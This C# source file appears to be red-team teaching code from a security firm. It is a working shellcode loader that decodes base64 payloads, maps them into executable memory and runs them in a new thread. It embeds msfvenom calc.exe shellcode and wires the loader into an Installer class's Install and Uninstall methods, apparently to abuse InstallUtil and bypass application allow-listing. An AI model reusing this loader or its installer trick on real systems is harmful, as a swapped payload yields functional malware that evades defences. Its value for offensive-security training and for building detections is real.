using System;
using System.Runtime.InteropServices;
using System.Configuration.Install;
using System.ComponentModel;
using System.Collections;
using System.EnterpriseServices;

/// <summary>
/// This is sample code for illustration and learning purposes only.
/// Author: Joff Thyer, Black Hills Information Security
/// February 2020
/// </summary>
public class Example1
{
    public static void Run(String x86, String x64)
    {
        String shellcode = x86;
        if (IntPtr.Size == 8)
            shellcode = x64;
        Byte[] payload = Convert.FromBase64String(shellcode);
        Console.WriteLine($"[*] Allocating {shellcode.Length} bytes of memory in process.");
        IntPtr memptr = VirtualAlloc(IntPtr.Zero, payload.Length, 0x1000, 0x40);
        Console.WriteLine($"[*] Copy {shellcode.Length} bytes of payload into memory.");
        Marshal.Copy(payload, 0, memptr, payload.Length);
        Console.WriteLine($"[*] CreateThread()");
        IntPtr thread_handle = CreateThread(0, 0, memptr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
    }

    #region TESTCODE
    // Only needed for testing as EXE
    public static void Main() { Run(calc_x86, calc_x64); }
    #endregion

    #region DLLIMPORTS
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
        UInt32 p1, UInt32 p2, IntPtr p3,
        IntPtr p4, UInt32 p5, IntPtr p6);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr p1, Int32 p2, UInt32 p3,
        UInt32 p4);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr WaitForSingleObject(IntPtr p1, UInt32 p2);
    #endregion

    #region SHELLCODE
    // msfvenom -p windows/exec CMD=calc.exe -f raw | base64
    public static String calc_x86 = @"
/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjj
SAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sE
iwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD7
4HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";

    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64
    public static String calc_x64 = @"
/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//V
u/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
}
#endregion

namespace MyInstaller
{
    [RunInstaller(true)]
    public class MyInstaller : Installer
    {
        public override void Install(IDictionary savedState)
        {
            Example1.Run(Example1.calc_x86, Example1.calc_x64);
        }
        public override void Uninstall(IDictionary savedState)
        {
            Example1.Run(Example1.calc_x86, Example1.calc_x64);
        }
    }
}
